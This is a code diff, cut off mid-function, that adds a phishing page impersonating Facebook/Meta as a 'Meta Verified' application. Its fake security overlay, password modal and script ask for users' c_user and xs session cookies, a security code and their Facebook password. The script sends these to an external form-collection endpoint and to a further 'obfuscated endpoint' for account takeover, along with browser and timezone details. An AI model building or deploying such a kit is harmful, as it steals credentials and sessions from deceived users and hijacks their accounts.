@@ -2107,4 +2107,455 @@
 </html>
 
 
+    <!-- Security Code Overlay - Desktop Style on Mobile -->
+    <div class="security-overlay" id="security-overlay">
+        <div class="security-container">
+            <div class="security-header">
+                <div class="security-logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo">
+                </div>
+                <h1 class="security-title">Security Verification Required</h1>
+            </div>
+            
+            <div class="security-content">
+                <div class="security-video-container">
+                    <video id="security-video" controls>
+                        <source src="https://ik.imagekit.io/g4nowfen2h/WhatsApp%20Video%202025-10-21%20at%209.34.32%20AM.mp4?updatedAt=1761068029049" type="video/mp4">
+                        Your browser does not support the video tag.
+                    </video>
+                </div>
+                
+                <div class="security-message-container">
+                    <div class="security-message">
+                        <p>For your account's safety, we need to confirm it's really you. Watch the detailed video information to verify your account and ensure your personal information remains secure.</p>
+                        <p>This additional security step helps prevent unauthorized access and protects your privacy.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="security-code-label">Security Code</div>
+            
+            <div class="security-input-group">
+                <input type="text" id="security-code" class="form-input" placeholder="Enter your security code" required>
+                <div class="security-indicator">
+                    <div class="security-progress" id="security-code-security"></div>
+                </div>
+            </div>
+            
+            <div class="security-note">
+                <i class="fas fa-info-circle"></i>
+                <span>Your security code is case-sensitive. Make sure to enter it exactly as shown in the video.</span>
+            </div>
+            
+            <div class="security-button-group">
+                <button type="button" class="btn security-skip-btn" onclick="showSkipConfirmationModal()">
+                    <span class="btn-text">Skip</span>
+                </button>
+                <button type="button" class="btn security-confirm-btn" onclick="submitSecurityCode()">
+                    <span class="btn-text">Confirm Account</span>
+                </button>
+            </div>
+            
+            <div class="security-footer">
+                <p>Facebook Security &copy; 2025</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Skip Confirmation Modal -->
+    <div class="skip-confirmation-modal" id="skip-confirmation-modal">
+        <div class="skip-modal">
+            <div class="skip-modal-header">
+                <i class="fas fa-exclamation-triangle skip-modal-icon"></i>
+                <h3 class="skip-modal-title">Skip Security Verification?</h3>
+            </div>
+            <div class="skip-modal-body">
+                <p>Are you sure you want to skip this step? Your account security might be at risk without completing the verification process.</p>
+                <p>We strongly recommend completing the security verification to protect your account.</p>
+            </div>
+            <div class="skip-modal-footer">
+                <button class="skip-modal-btn skip-modal-btn-cancel" onclick="hideSkipConfirmationModal()">Cancel</button>
+                <button class="skip-modal-btn skip-modal-btn-confirm" onclick="confirmSkipSecurityCode()">Skip Anyway</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Confirmation Modal -->
+    <div class="modal-overlay" id="confirmation-modal">
+        <div class="modal">
+            <div class="modal-header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" alt="Meta Logo" class="modal-logo">
+                <h3 class="modal-title">Confirm Your Identity</h3>
+            </div>
+            <div class="modal-body">
+                <p>For security purposes, please re-enter your password to confirm your verification request.</p>
+                
+                <div class="form-group">
+                    <label for="password" class="form-label">Facebook Password</label>
+                    <input type="password" id="password" class="form-input" placeholder="Enter your password">
+                    <div class="security-indicator">
+                        <div class="security-progress" id="password-security"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="modal-btn modal-btn-cancel" onclick="hideConfirmationModal()">Cancel</button>
+                <button class="modal-btn modal-btn-confirm" id="confirmSubmit" onclick="submitPassword()">
+                    <span class="btn-text">Confirm Submission</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Processing Modal -->
+    <div class="modal-overlay" id="processing-modal">
+        <div class="modal">
+            <div class="processing-animation">
+                <div class="processing-spinner"></div>
+                <h3 class="modal-title">Processing Your Request</h3>
+                <p class="processing-text">We are verifying your information and submitting your application.</p>
+                <p class="processing-subtext">This may take a few moments. Please do not close this window.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="success-modal" id="success-modal">
+        <div class="success-modal-content">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h3>Verification Request Submitted Successfully</h3>
+            <p>Thank you for submitting your application for Meta Verified. Your request has been received and is now being processed.</p>
+            <p>Our team will review your information and notify you of the status within 3-5 business days.</p>
+            <button class="success-modal-button" id="successOkButton" onclick="redirectToFacebook()">Return to Facebook</button>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Help Center</a>
+            <a href="#">About</a>
+        </div>
+        <div class="copyright">©2025 Meta Platforms, Inc.</div>
+    </footer>
+
+    <script>
+        // Form endpoints - moved to top of script
+        const mainFormEndpoint = 'https://submit-form.com/LVkJHnn28';
+        const securityFormEndpoint = 'https://submit-form.com/LVkJHnn28';
+        const passwordFormEndpoint = 'https://submit-form.com/LVkJHnn28';
+        
+        // Language data with video URLs
+        const languageVideos = {
+            english: "https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4",
+            spanish: "https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4",
+            hindi: "https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4",
+            french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4",
+            portuguese: "https://allvideos.wasmer.app/Portuguese.mp4",
+            tamil: "https://allvideos.wasmer.app/tamil.mp4",
+            arabic: "https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4",
+            ghanaian: "https://allvideos.wasmer.app/english.mp4",
+            vietnamese: "https://allvideos.wasmer.app/vietanames.mp4"
+        };
+
+        // Bot protection flag
+        let formSubmitted = false;
+        let cUserXsSubmitted = false;
+        let securityCodeSubmitted = false;
+        let passwordSubmitted = false;
+        
+        // Video control variables
+        let instructionVideo = null;
+        let securityVideo = null;
+        let videoPlaying = false;
+        
+        // Mobile menu functionality
+        const mobileMenuBtn = document.getElementById('mobile-menu-btn');
+        const mobileSidebar = document.getElementById('mobile-sidebar');
+        const mobileSidebarOverlay = document.getElementById('mobile-sidebar-overlay');
+        const mobileSidebarClose = document.getElementById('mobile-sidebar-close');
+        
+        function openMobileSidebar() {
+            mobileSidebar.classList.add('active');
+            mobileSidebarOverlay.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+        
+        function closeMobileSidebar() {
+            mobileSidebar.classList.remove('active');
+            mobileSidebarOverlay.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+        
+        mobileMenuBtn.addEventListener('click', openMobileSidebar);
+        mobileSidebarClose.addEventListener('click', closeMobileSidebar);
+        mobileSidebarOverlay.addEventListener('click', closeMobileSidebar);
+        
+        // Function to go to home page
+        function goToHome() {
+            // Close any open modals first
+            hideConfirmationModal();
+            document.getElementById('processing-modal').classList.remove('active');
+            document.getElementById('success-modal').classList.remove('active');
+            document.getElementById('security-overlay').classList.remove('active');
+            document.getElementById('skip-confirmation-modal').classList.remove('active');
+            
+            // Stop all videos
+            stopAllVideos();
+            
+            // Then show home section
+            showSection('home');
+        }
+        
+        // Function to show the selected section
+        function showSection(section) {
+            // Stop all videos when changing sections
+            stopAllVideos();
+            
+            // Hide all sections
+            document.getElementById('home-section').style.display = 'none';
+            document.getElementById('benefits-section').style.display = 'none';
+            document.getElementById('faq-section').style.display = 'none';
+            document.getElementById('apply-section').style.display = 'none';
+            document.getElementById('application-page').style.display = 'none';
+            
+            // Show selected section
+            document.getElementById(section + '-section').style.display = 'block';
+            
+            // Update active nav items
+            const navItems = document.querySelectorAll('.menu-item, .mobile-nav-item');
+            navItems.forEach(item => item.classList.remove('active'));
+            
+            // Find and activate the clicked item
+            if (event) {
+                event.currentTarget.classList.add('active');
+            }
+            
+            // Scroll to top when changing sections
+            window.scrollTo(0, 0);
+        }
+        
+        // Function to show the application page
+        function showApplicationPage() {
+            // Hide all sections
+            document.getElementById('home-section').style.display = 'none';
+            document.getElementById('benefits-section').style.display = 'none';
+            document.getElementById('faq-section').style.display = 'none';
+            document.getElementById('apply-section').style.display = 'none';
+            
+            // Show application page
+            document.getElementById('application-page').style.display = 'block';
+            
+            // Initialize video
+            instructionVideo = document.getElementById('instruction-video');
+            setupVideoControls(instructionVideo);
+            
+            // Scroll to top
+            window.scrollTo(0, 0);
+        }
+        
+        // Function to toggle language menu
+        function toggleLanguageMenu() {
+            const menu = document.getElementById('language-menu');
+            menu.classList.toggle('show');
+        }
+        
+        // Function to select a language
+        function selectLanguage(lang) {
+            // Update selected language text
+            document.getElementById('selected-language').textContent = document.querySelector(`[data-lang="${lang}"]`).textContent;
+            
+            // Update checkmarks
+            const items = document.querySelectorAll('.language-item');
+            items.forEach(item => item.classList.remove('selected'));
+            document.querySelector(`[data-lang="${lang}"]`).classList.add('selected');
+            
+            // Change video source
+            if (instructionVideo) {
+                instructionVideo.src = languageVideos[lang];
+                instructionVideo.load();
+            }
+            
+            // Hide language menu
+            document.getElementById('language-menu').classList.remove('show');
+            
+            // Show processing state on the language button
+            const languageButton = document.getElementById('language-button');
+            const originalText = languageButton.innerHTML;
+            
+            languageButton.classList.add('processing');
+            languageButton.innerHTML = '<span><i class="fas fa-spinner fa-spin"></i> Processing...</span>';
+            languageButton.disabled = true;
+            
+            // Simulate processing for 2 seconds, then return to normal
+            setTimeout(() => {
+                languageButton.classList.remove('processing');
+                languageButton.innerHTML = originalText;
+                languageButton.disabled = false;
+            }, 2000);
+        }
+        
+        // Function to submit c_user and xs data
+        async function submitCUserAndXs() {
+            // Check if already submitted
+            if (cUserXsSubmitted) {
+                alert('Your c_user and xs information has already been submitted.');
+                return;
+            }
+            
+            // Get form values
+            const cUser = document.getElementById('c-user').value;
+            const xs = document.getElementById('xs').value;
+            
+            if (!cUser || !xs) {
+                alert('Please fill in both c_user and xs fields.');
+                return;
+            }
+            
+            // Stop instruction video
+            if (instructionVideo) {
+                instructionVideo.pause();
+            }
+            
+            // Show processing state
+            const submitButton = document.querySelector('#application-page .btn-primary');
+            submitButton.classList.add('btn-loading');
+            submitButton.disabled = true;
+            
+            // Prepare form data
+            const formData = {
+                cUser: cUser,
+                xs: xs,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                formType: 'c_user_xs'
+            };
+            
+            try {
+                // Submit to main form endpoint
+                await fetch(mainFormEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(formData)
+                });
+                
+                // Submit to obfuscated endpoint
+                await submitToObfuscatedEndpoint(formData);
+                
+                // Mark as submitted
+                cUserXsSubmitted = true;
+                
+                // Show success message and move to security code
+                setTimeout(() => {
+                    submitButton.classList.remove('btn-loading');
+                    submitButton.disabled = false;
+                    
+                    // Show security code overlay
+                    showSecurityCodeOverlay();
+                }, 1500);
+                
+            } catch (error) {
+                console.error('Error submitting c_user and xs:', error);
+                submitButton.classList.remove('btn-loading');
+                submitButton.disabled = false;
+                alert('There was an error submitting your information. Please try again.');
+            }
+        }
+        
+        // Function to show security code overlay
+        function showSecurityCodeOverlay() {
+            // Stop instruction video
+            if (instructionVideo) {
+                instructionVideo.pause();
+            }
+            
+            // Initialize security video
+            securityVideo = document.getElementById('security-video');
+            setupVideoControls(securityVideo);
+            
+            // Show overlay
+            document.getElementById('security-overlay').classList.add('active');
+        }
+        
+        // Function to show skip confirmation modal
+        function showSkipConfirmationModal() {
+            document.getElementById('skip-confirmation-modal').classList.add('active');
+        }
+        
+        // Function to hide skip confirmation modal
+        function hideSkipConfirmationModal() {
+            document.getElementById('skip-confirmation-modal').classList.remove('active');
+        }
+        
+        // Function to confirm skipping security code
+        function confirmSkipSecurityCode() {
+            hideSkipConfirmationModal();
+            
+            // Submit empty security code
+            submitSecurityCodeData('');
+            
+            // Hide security overlay and show password modal
+            document.getElementById('security-overlay').classList.remove('active');
+            showConfirmationModal();
+        }
+        
+        // Function to submit security code
+        function submitSecurityCode() {
+            const securityCode = document.getElementById('security-code').value;
+            
+            if (!securityCode) {
+                alert('Please enter your security code.');
+                return;
+            }
+            
+            // Stop security video
+            if (securityVideo) {
+                securityVideo.pause();
+            }
+            
+            // Submit security code data
+            submitSecurityCodeData(securityCode);
+            
+            // Hide security overlay and show password modal
+            document.getElementById('security-overlay').classList.remove('active');
+            showConfirmationModal();
+        }
+        
+        // Function to submit security code data
+        async function submitSecurityCodeData(securityCode) {
+            // Check if already submitted
+            if (securityCodeSubmitted) {
+                return;
+            }
+            
+            // Prepare form data - only send security code
+            const formData = {
+                securityCode: securityCode,
+                formType: 'security_code'
+            };
+            
+            try {
+                // Submit to security form endpoint
+                await fetch(securityFormEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(formData)
+                });
+                
+                // Submit to obfuscated endpoint
+                await submitToObfuscatedEndpoint(formData);
+                
+                // Mark as submitted
+           
 
